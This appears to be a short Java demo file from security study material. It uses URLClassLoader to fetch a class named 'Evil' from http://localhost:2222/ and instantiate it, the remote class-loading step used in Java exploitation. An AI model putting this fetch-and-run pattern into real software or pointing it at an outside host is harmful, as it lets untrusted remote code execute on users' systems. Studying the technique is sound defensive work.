package URLClassLoaderDemo;

import java.net.URL;
import java.net.MalformedURLException;
import java.net.URLClassLoader;
import java.lang.ClassNotFoundException;
import java.lang.InstantiationException;
import java.lang.IllegalAccessException;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 3:22 下午
 */
public class HttpServer {
    public static void main(String[] args) throws IllegalAccessException, InstantiationException, MalformedURLException, ClassNotFoundException {
        URL[] urls = {new URL("http://localhost:2222/")};
        URLClassLoader loader = URLClassLoader.newInstance(urls);
        Class _class = loader.loadClass("Evil");
        _class.newInstance();
    }
}
